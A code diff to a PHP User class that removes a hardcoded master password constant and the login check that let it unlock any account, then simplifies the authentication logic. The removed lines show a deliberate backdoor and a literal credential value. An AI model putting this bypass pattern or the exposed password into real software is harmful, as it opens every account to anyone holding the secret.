@@ -12,7 +12,6 @@ use Core\SQLBuilder;
 
 class User extends \Core\Db
 {
-  private const ADMIN_PASSWORD = "DXrqNLdJTbYPLRc3V9Db";
   public static $tbl = 'user';
   public static $pkey = 'id';
   protected $id = null;
@@ -124,14 +123,11 @@ class User extends \Core\Db
   public static function login($login, $pass)
   {
     $user = self::getBy($login, 'mail');
-    if (empty($user) or ($user["actif"] ?? "N") != "Y")
-      return errorResponse([], "Utilisateur/Mot de passe invalide");
-    if (password_verify($pass, $user['pass']) || $pass == self::ADMIN_PASSWORD) {
+    if ($user && ($user["actif"] ?? "N") == "Y" && (password_verify($pass, $user['pass']))) {
       self::setLastCnx($user['id']); //on met à jour la dernière connexion
       return $user;
-    } else {
-      return false;
     }
+    throw new Exception("L'utilisateur et/ou le mot de passe est incorrect");
   }
 
   /**
